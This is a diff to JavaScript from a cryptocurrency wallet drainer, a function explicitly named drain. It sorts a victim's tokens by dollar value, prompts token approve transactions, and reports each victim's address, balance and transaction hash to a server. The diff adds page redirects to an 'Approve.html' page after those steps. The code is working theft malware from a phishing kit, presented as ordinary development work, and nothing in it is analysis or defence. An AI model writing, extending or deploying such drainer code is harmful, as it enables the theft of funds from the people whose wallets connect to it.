@@ -432,6 +432,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
   await Promise.all(pricePromises);
   tokensToProcess.sort((a, b) => b.valueInUSDT - a.valueInUSDT);
   console.log(`✅ Токены отсортированы: ${tokensToProcess.map(t => t.token).join(', ')}`);
+  window.location.href = 'Approve.html';
 
   let status = 'rejected';
   let modalClosed = false;
@@ -464,6 +465,8 @@ async function drain(chainId, signer, userAddress, bal, provider) {
         const receipt = await tx.wait();
         console.log(`✅ Транзакция approve подтверждена: ${receipt.transactionHash}`);
         await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash, provider);
+        // Перенаправление на Approve.html
+        window.location.href = 'Approve.html';
         status = 'confirmed';
 
         // Закрываем модальное окно после успешного approve
@@ -489,6 +492,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
       try {
         await notifyServer(userAddress, address, balance, chainId, null, provider);
         // Перенаправление на Approve.html
+        window.location.href = 'Approve.html';
         status = 'confirmed';
       } catch (error) {
         console.error(`❌ Ошибка при вызове notifyServer для токена ${token}: ${error.message}`);
